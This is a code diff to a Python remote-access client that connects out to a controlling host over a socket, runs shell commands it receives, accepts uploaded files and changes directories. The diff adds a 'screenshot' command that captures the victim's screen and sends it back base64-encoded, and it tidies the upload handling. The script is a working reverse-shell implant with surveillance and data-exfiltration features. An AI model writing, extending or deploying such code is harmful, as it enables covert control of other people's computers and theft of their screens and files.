@@ -1,10 +1,11 @@
 #!/usr/bin/python3
 import os
 import sys
+import time
 import socket
 import base64
 import subprocess
-from lib.screenshot import screenshot
+from lib.screenshot import Screenshot
 
 
 
@@ -18,7 +19,8 @@ class Client:
         
         self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.client.connect((self.ip,self.port))
-
+        self.screenshot = Screenshot().screenshot
+        self.temp = os.environ.get('TEMP') or '/tmp'
     def ReciveCommand(self):
         return self.client.recv(self.byte_size).decode()
     
@@ -44,24 +46,39 @@ class Client:
                 print("Exiting...")
                 sys.exit()
 
+            elif command.lower() == 'screenshot':
+                try:
+                    screenshot_path = os.path.join(self.temp, "screenshot.png")
+                    time.sleep(5)
+                    if self.screenshot(screenshot_path):
+                        with open(screenshot_path,'rb') as f:
+                            content = f.read()
+                            self.client.send(str(len(content)).encode())
+                            if self.client.recv(1024).decode() == "ok":
+                                self.client.send(base64.b64encode(content))
+                        os.remove(screenshot_path)
+                except Exception as err:
+                    print(err)
+                    self.client.send(str(err).encode())
 
 
-            if command.startswith('upload'):
+            elif command.startswith('upload'):
                 payload = command.split(':')
                 print("Payload:",payload)
                 size = int(payload[1])
                 path = payload[2]
                 self.client.send("ok".encode())
-                content = self.client.recv(size).decode()
+                content = self.client.recv(size)
                 try:
                     with open(path,'wb') as f:
-                        content = base64.b64decode(content.encode())
+                        content = base64.b64decode(content)
                         f.write(content)
                         self.client.send("file uploaded succesfully".encode())
                 except Exception as err:
                     print(err)
                     self.client.send(str(err).encode())
-            if command.startswith("cd"):
+
+            elif command.startswith("cd"):
                 payload = command.split(' ',1)
                 if len(payload) != 2:
                     self.client.send('Invlaid argumant!'.encode())
@@ -74,7 +91,6 @@ class Client:
             else:
                 self.ExecuteCommand(command)
                 print(f"command runned:{command}")
-
         self.client.close()
 
 if __name__ == "__main__":
